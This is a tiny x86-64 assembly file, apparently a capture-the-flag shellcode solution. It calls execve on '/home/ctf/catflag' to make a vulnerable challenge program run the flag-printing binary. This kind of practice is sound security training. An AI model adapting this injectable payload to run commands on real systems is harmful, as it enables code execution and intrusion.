.global _start
_start:
.intel_syntax noprefix
        mov rax, 59
        lea rdi, [rip+flag]
        mov rsi, 0
        mov rdx, 0
        syscall
flag:
        .string "/home/ctf/catflag"
